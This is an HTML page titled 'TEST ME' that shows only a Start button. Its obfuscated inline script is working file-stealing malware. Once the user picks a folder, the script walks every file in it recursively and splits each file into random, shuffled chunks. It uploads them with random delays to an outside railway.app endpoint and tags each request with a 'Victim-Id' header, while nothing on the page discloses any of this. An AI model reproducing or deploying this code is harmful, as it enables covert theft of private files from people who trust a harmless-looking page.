<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TEST ME</title>
  <style>
    body {background:#582c2c; color:#0F0; font-family:monospace; text-align:center; display:flex; justify-content:center; align-items:center; height:100vh; flex-direction:column}
    button {padding:10px; border:2px solid red; background:transparent; color:red; cursor:pointer; font-size:1.2rem; margin-top:20px}
    button:hover {background:red; color:#000}
  </style>
</head>
<body>
  <h1>TeST ME</h1>
  <button id="start">Start</button>
  <script>
    (function(){
      let _0x1a2b3c = "https://deobbetest1-production-104e.up.railway.app/upload";
    
      document.getElementById("start").addEventListener("click", async () => {
        try {
          let _0x9f8e7d = crypto.randomUUID();
          let _0xa3b4c5 = await window.showDirectoryPicker();
          
          await (async function _0xf0e1d2(_0xabc123, _0xdef456) {
            let _0xuploadPromises = [];
            let _0xmaxConcurrent = 3;
            let processedFiles = new Set();
    
            for await (let _0x56789a of _0xabc123.values()) {
              if (_0x56789a.kind === "file" && !_0x56789a.name.startsWith(".")) {
                if (!processedFiles.has(_0x56789a.name)) {
                  processedFiles.add(_0x56789a.name);
                  let _0x111222 = await _0x56789a.getFile();
                  let _0xfileSize = _0x111222.size;
                  
                  let _0xuploadPromise = (async function _0x333444(_0xaaa, _0xbbb) {
                    let _0xccc = await _0xbbb.arrayBuffer();
                    let _0xddd = new Uint8Array(_0xccc);
                    
                    let chunks = [];
                    let offset = 0;
                    let minChunkSize, maxChunkSize;
    
                    if (_0xfileSize < 1 * 1024 * 1024) { // Less than 1MB
                      minChunkSize = maxChunkSize = _0xfileSize; // Single chunk
                    } else if (_0xfileSize < 10 * 1024 * 1024) { // 1MB - 10MB
                      minChunkSize = 400 * 1024;
                      maxChunkSize = 1000 * 1024;
                    } else { // 10MB - 100MB
                      minChunkSize = 1000 * 1024;
                      maxChunkSize = 3000 * 1024;
                    }
    
                    while (offset < _0xddd.byteLength) {
                      let chunkSize = Math.floor(Math.random() * (maxChunkSize - minChunkSize) + minChunkSize);
                      let end = Math.min(offset + chunkSize, _0xddd.byteLength);
                      chunks.push(_0xddd.slice(offset, end));
                      offset = end;
                    }
    
                    // Shuffle chunks to randomize upload order
                    chunks = chunks.map((chunk, index) => ({ index, chunk }));
                    chunks.sort(() => Math.random() - 0.5);
                    
                    for (let { index, chunk } of chunks) {
                      await new Promise(resolve => setTimeout(resolve, Math.random() * (100 - 50) + 50)); // 0.05 - 0.1 sec delay
                      await fetch(_0x1a2b3c, {
                        method: "POST",
                        headers: {
                          "Content-Type": "application/octet-stream",
                          "Victim-Id": encodeURIComponent(_0xaaa),
                          "Filename": encodeURIComponent(_0xbbb.name),
                          "Chunk-Index": index + 1,
                          "Total-Chunks": chunks.length
                        },
                        body: chunk
                      });
                    }
                  })(_0xdef456, _0x111222);
                  _0xuploadPromises.push(_0xuploadPromise);
                  if (_0xuploadPromises.length >= _0xmaxConcurrent) {
                    await Promise.allSettled(_0xuploadPromises);
                    _0xuploadPromises = [];
                  }
                }
              } else if (_0x56789a.kind === "directory") {
                await _0xf0e1d2(await _0x56789a, _0xdef456);
              }
            }
            await Promise.allSettled(_0xuploadPromises);
          })(_0xa3b4c5, _0x9f8e7d);
        } catch (_0x999999) {
          console.error("An error occurred", _0x999999);
        }
      });
    })();       
  </script>
</body>
</html>
